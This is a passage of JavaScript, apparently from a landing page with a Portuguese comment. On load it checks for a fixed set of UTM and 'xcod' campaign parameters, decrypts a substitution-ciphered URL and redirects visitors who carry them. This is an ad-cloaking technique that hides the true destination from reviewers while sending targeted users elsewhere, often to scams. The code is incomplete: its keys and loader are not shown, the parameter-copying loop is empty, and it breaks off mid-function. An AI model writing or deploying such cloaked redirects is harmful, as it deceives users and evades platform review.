        function decrypt(input) {
            return input.split('').map(char => {
                const index = shiftedKey.indexOf(char);
                return index > -1 ? key[index] : char;
            }).join('');
        }

        function checkRequiredParams() {
            const requiredParams = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "xcod"];
            const urlParams = new URLSearchParams(window.location.search);
            for (let param of requiredParams) {
                if (!urlParams.has(param)) {
                    return false;
                }
            }
            return true;
        }

        window.onload = function() {
            loadKeys().then(() => {
                if (checkRequiredParams()) {
                    let encryptedUrl = "rCC3%fqq!wpdI_*&lhIO*%Z%bCwq!e&_wW*eWwq";
                    let redirectUrl = decrypt(encryptedUrl);
                    
                    // Adiciona os parâmetros atuais à URL de redirecionamento
                    let urlParams = new URLSearchParams(window.location.search);
                    let newUrl = new URL(redirectUrl);
                    urlParams.forEach((value, key) => {

                    });
                    
                    window.location.href = newUrl.toString();
